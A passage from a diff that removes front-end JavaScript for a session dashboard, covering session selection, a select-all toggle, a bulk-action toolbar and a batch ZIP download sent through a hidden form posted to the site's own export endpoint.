-        state.selectedSessions.delete(sessionId);
-    }
-    const card = document.getElementById(`card-${sessionId}`);
-    if (card) {
-        if (isChecked) card.classList.add('session-card--selected');
-        else card.classList.remove('session-card--selected');
-    }
-    updateBulkToolbar();
-    updateSelectAllButtonText();
-};
-
-function updateSelectAllButtonText() {
-    if (!ui.selectAllText) return;
-    const allSessions = state.dashboardSessions;
-    const filterVal = ui.clientFilter ? ui.clientFilter.value : '';
-    const visibleSessions = filterVal ? allSessions.filter(s => s.client_name === filterVal) : allSessions;
-    const allVisibleSelected = visibleSessions.length > 0 && visibleSessions.every(s => state.selectedSessions.has(s.session_id));
-    ui.selectAllText.textContent = allVisibleSelected ? 'Deselect All' : 'Select All';
-}
-
-function toggleSelectAll() {
-    const allSessions = state.dashboardSessions;
-    const filterVal = ui.clientFilter ? ui.clientFilter.value : '';
-    const visibleSessions = filterVal ? allSessions.filter(s => s.client_name === filterVal) : allSessions;
-    if (visibleSessions.length === 0) return;
-
-    const allVisibleSelected = visibleSessions.every(s => state.selectedSessions.has(s.session_id));
-    if (allVisibleSelected) {
-        visibleSessions.forEach(s => state.selectedSessions.delete(s.session_id));
-    } else {
-        visibleSessions.forEach(s => state.selectedSessions.add(s.session_id));
-    }
-    renderSessionsList();
-}
-
-function clearSelection() {
-    state.selectedSessions.clear();
-    renderSessionsList();
-}
-
-function updateBulkToolbar() {
-    const count = state.selectedSessions.size;
-    if (ui.bulkSelectedCount) ui.bulkSelectedCount.textContent = count;
-    if (ui.bulkToolbar) {
-        if (count > 0) {
-            ui.bulkToolbar.classList.add('visible');
-        } else {
-            ui.bulkToolbar.classList.remove('visible');
-        }
-    }
-}
-
-function downloadSelectedSessions(format = 'pro_chunks') {
-    const ids = Array.from(state.selectedSessions);
-    if (ids.length === 0) {
-        showToast('Please select at least one session to download', 'warning');
-        return;
-    }
-
-    const formatLabel = format === 'audio' ? 'Merged Audio ZIP' : 'Pro Chunks & Telemetry ZIP';
-    showToast(`🚀 Streaming ${formatLabel} for ${ids.length} session${ids.length > 1 ? 's' : ''}...`, 'success');
-
-    // Submit hidden POST form to trigger direct streaming download
-    const form = document.createElement('form');
-    form.method = 'POST';
-    form.action = '/api/v1/broadcasts/batch-export-zip';
-    form.style.display = 'none';
-
-    const inputIds = document.createElement('input');
-    inputIds.type = 'hidden';
-    inputIds.name = 'session_ids';
-    inputIds.value = ids.join(',');
-    form.appendChild(inputIds);
-
-    const inputFormat = document.createElement('input');
-    inputFormat.type = 'hidden';
-    inputFormat.name = 'format';
-    inputFormat.value = format;
-    form.appendChild(inputFormat);
-
-    document.body.appendChild(form);
-    form.submit();
-    setTimeout(() => {
-        if (document.body.contains(form)) document.body.removeChild(form);
-    }, 2000);
-}
-
